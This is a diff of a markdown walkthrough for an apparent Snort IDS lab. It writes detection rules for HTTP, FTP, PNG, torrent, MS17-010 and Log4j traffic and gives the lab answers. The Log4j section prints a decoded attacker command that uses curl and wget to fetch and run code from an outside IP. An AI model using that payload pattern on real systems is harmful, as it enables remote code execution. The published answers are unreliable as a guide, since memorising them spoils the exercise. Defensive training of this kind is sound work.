@@ -30,6 +30,8 @@ Exercise files for each task are located on the desktop in the directory `/home/
 
 Let's create IDS Rules for HTTP traffic!
 
+---------------------------------------------------------------------------------------
+
 Navigate to the task folder and use the given pcap file. Write a rule to detect all TCP packets **from or to** port 80.
 
 #### What is the number of detected packets you got?
@@ -51,7 +53,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -q -c
 164
 ```
 
-Answer: 164
+Answer: `164`
 
 #### Investigate the log file. What is the destination address of packet 63?
 
@@ -96,7 +98,7 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 216.239.59.99
+Answer: `216.239.59.99`
 
 #### Investigate the log file. What is the ACK number of packet 64?
 
@@ -128,7 +130,7 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 0x2E6B5384
+Answer: `0x2E6B5384`
 
 #### Investigate the log file. What is the SEQ number of packet 62?
 
@@ -160,7 +162,7 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 0x36C21E28
+Answer: `0x36C21E28`
 
 #### Investigate the log file. What is the TTL of packet 65?
 
@@ -192,7 +194,7 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 128
+Answer: `128`
 
 #### Investigate the log file. What is the source IP of packet 65?
 
@@ -224,7 +226,7 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 145.254.160.237
+Answer: `145.254.160.237`
 
 #### Investigate the log file. What is the source port of packet 65?
 
@@ -256,11 +258,13 @@ Snort ran for 0 days 0 hours 0 minutes 0 seconds
 <---snip--->
 ```
 
-Answer: 3372
+Answer: `3372`
 
 ### Task 3 - Writing IDS Rules (FTP)
 
 Let's create IDS Rules for FTP traffic!
+
+---------------------------------------------------------------------------------------
 
 Navigate to the task folder. Use the given pcap file.
 
@@ -298,7 +302,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 307
+Answer: `307`
 
 #### Investigate the log file. What is the FTP service name?
 
@@ -332,7 +336,7 @@ TCP Options (3) => NOP NOP TS: 13955 7457661
 <---snip--->
 ```
 
-Answer: Microsoft FTP Service
+Answer: `Microsoft FTP Service`
 
 Clear the previous log and alarm files. Deactivate/comment on the old rules.
 
@@ -370,7 +374,6 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cat local.rules
 # This file intentionally does not come with signatures.  Put your local
 # additions here.
 alert tcp any 21 <> any any (msg: "FTP Failed login"; content:"530 User "; sid: 200003; rev:1;)
-
 ```
 
 #### What is the number of detected packets?
@@ -397,13 +400,13 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 41
+Answer: `41`
 
 Clear the previous log and alarm files. Deactivate/comment on the old rule.
 
 Write a rule to detect successful FTP logins in the given pcap.
 
-The status code for successful logins is probably `230` (User logged in, proceed.).
+The [status code](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes) for successful logins is probably `230` (User logged in, proceed.).
 
 As before we doublecheck the status message, this time with `tcpdump`
 
@@ -456,7 +459,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 1
+Answer: `1`
 
 Clear the previous log and alarm files. Deactivate/comment on the old rule.
 
@@ -494,7 +497,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 42
+Answer: `42`
 
 Clear the previous log and alarm files. Deactivate/comment on the old rule.
 
@@ -527,11 +530,13 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 7
+Answer: `7`
 
 ### Task 4 - Writing IDS Rules (PNG)
 
 Let's create IDS Rules for PNG files in the traffic!
+
+---------------------------------------------------------------------------------------
 
 Navigate to the task folder. Use the given pcap file.
 
@@ -552,7 +557,6 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-4 (PNG)$ cat local.rules
 # additions here.
 
 alert tcp any any <> any any (msg: "PNG File Header"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid: 200007; rev:1;)
-
 ```
 
 Run snort to create a log file
@@ -603,7 +607,7 @@ TCP TTL:128 TOS:0x0 ID:63105 IpLen:20 DgmLen:1174
 <---snip--->
 ```
 
-Answer: Adobe ImageReady
+Answer: `Adobe ImageReady`
 
 Clear the previous log and alarm files. Deactivate/comment on the old rule.
 
@@ -682,11 +686,13 @@ TCP TTL:128 TOS:0x0 ID:63093 IpLen:20 DgmLen:83
 ***AP**F Seq: 0x2FC56F3  Ack: 0xA6C502A7  Win: 0xFAF0  TcpLen: 20
 ```
 
-Answer: GIF89a
+Answer: `GIF89a`
 
 ### Task 5 - Writing IDS Rules (Torrent Metafile)
 
 Let's create IDS Rules for torrent metafiles in the traffic!
+
+---------------------------------------------------------------------------------------
 
 Research the [Torrent file](https://en.wikipedia.org/wiki/Torrent_file) format but there doesn't seem to be any magic bytes headers.  
 Instead, a torrent file "just" contains metadata about the files and folders to be distributed.
@@ -704,7 +710,6 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ cat l
 # This file intentionally does not come with signatures.  Put your local
 # additions here.
 alert tcp any any <> any any (msg: "Torrent File Extension"; content:".torrent"; sid: 200010; rev:1;)
-
 ```
 
 #### What is the number of detected packets?
@@ -731,7 +736,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 2
+Answer: `2`
 
 #### Investigate the log/alarm files. What is the name of the torrent application?
 
@@ -783,7 +788,7 @@ TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
 
 I really didn't get this question's answer and solved it with a lot of trial-and-error!?
 
-Answer: bittorrent
+Answer: `bittorrent`
 
 #### What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
 
@@ -833,7 +838,7 @@ TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
 <---snip--->
 ```
 
-Answer: application/x-bittorrent
+Answer: `application/x-bittorrent`
 
 #### What is the hostname of the torrent metafile?
 
@@ -883,11 +888,13 @@ TCP TTL:128 TOS:0x0 ID:22748 IpLen:20 DgmLen:390 DF
 <---snip--->
 ```
 
-Answer: tracker2.torrentbox.com
+Answer: `tracker2.torrentbox.com`
 
 ### Task 6 - Troubleshooting Rule Syntax Errors
 
 Let's troubleshoot rule syntax errors!
+
+---------------------------------------------------------------------------------------
 
 In this section, you need to fix the syntax errors in the given rule files.
 
@@ -914,7 +921,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 16
 ```
 
-Answer: 16
+Answer: `16`
 
 Fix the syntax error in **local-2.rules** file and make it work smoothly.
 
@@ -935,7 +942,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 68
 ```
 
-Answer: 68
+Answer: `68`
 
 Fix the syntax error in **local-3.rules** file and make it work smoothly.
 
@@ -957,7 +964,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 87
 ```
 
-Answer: 87
+Answer: `87`
 
 Fix the syntax error in **local-4.rules** file and make it work smoothly.
 
@@ -979,7 +986,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 90
 ```
 
-Answer: 90
+Answer: `90`
 
 Fix the syntax error in **local-5.rules** file and make it work smoothly.
 
@@ -1002,7 +1009,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 155
 ```
 
-Answer: 155
+Answer: `155`
 
 Fix the logical error in **local-6.rules** file and make it work smoothly to create alerts.
 
@@ -1023,7 +1030,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 2
 ```
 
-Answer: 2
+Answer: `2`
 
 Fix the logical error in **local-7.rules** file and make it work smoothly to create alerts.
 
@@ -1044,11 +1051,13 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo 
 9
 ```
 
-Answer: msg
+Answer: `msg`
 
 ### Task 7 - Using External Rules (MS17-010)
 
 Let's use external rules to fight against the latest threats!
+
+---------------------------------------------------------------------------------------
 
 Navigate to the task folder. Use the given pcap file.
 
@@ -1094,11 +1103,11 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 25154
+Answer: `25154`
 
 Clear the previous log and alarm files.
 
-Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
+Use **local-1.rules** empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
 
 The rule becomes
 
@@ -1127,7 +1136,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 12
+Answer: `12`
 
 #### Investigate the log/alarm files. What is the requested path?
 
@@ -1167,11 +1176,13 @@ Hint: External search will help you to find the score!
 
 From `https://nvd.nist.gov/vuln/detail/CVE-2017-0144`
 
-Answer: 9.3
+Answer: `9.3`
 
 ### Task 8 - Using External Rules (Log4j)
 
 Let's use external rules to fight against the latest threats!
+
+---------------------------------------------------------------------------------------
 
 Navigate to the task folder. Use the given pcap file.
 
@@ -1216,7 +1227,7 @@ Action Stats:
 <---snip--->
 ```
 
-Answer: 26
+Answer: `26`
 
 #### Investigate the log/alarm files. How many rules were triggered?
 
@@ -1232,7 +1243,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | gre
 4
 ```
 
-Answer: 4
+Answer: `4`
 
 #### Investigate the log/alarm files. What are the first six digits of the triggered rule sids?
 
@@ -1246,7 +1257,7 @@ ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | gre
 [**] [1:21003731:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228) [**]
 ```
 
-Answer: 210037
+Answer: `210037`
 
 Clear the previous log and alarm files.
 
@@ -1279,9 +1290,9 @@ Action Stats:
 <---snip--->
 ```
 
-**Note**: The question didn't say anything about **TCP** packets  but since IP didn't work I tried TCP instead!?
+**Note**: The question didn't say anything about **TCP** packets but since IP didn't work I tried TCP instead!?
 
-Answer: 41
+Answer: `41`
 
 #### Investigate the log/alarm files. What is the name of the used encoding algorithm?
 
@@ -1359,7 +1370,7 @@ TCP Options (3) => NOP NOP TS: 1584792788 1670627000
 <---snip--->
 ```
 
-Answer: Base64
+Answer: `Base64`
 
 #### Investigate the log/alarm files. What is the IP ID of the corresponding packet?
 
@@ -1399,7 +1410,7 @@ TCP Options (3) => NOP NOP TS: 1584792788 1670627000
 <---snip--->
 ```
 
-Answer: 62808
+Answer: `62808`
 
 #### Investigate the log/alarm files. Decode the encoded command. What is the attacker's command?
 
@@ -1419,7 +1430,7 @@ Answer: `curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.23
 
 From `https://nvd.nist.gov/vuln/detail/CVE-2021-44228`
 
-Answer: 9.3
+Answer: `9.3`
 
 ### Task 9 - Conclusion
 
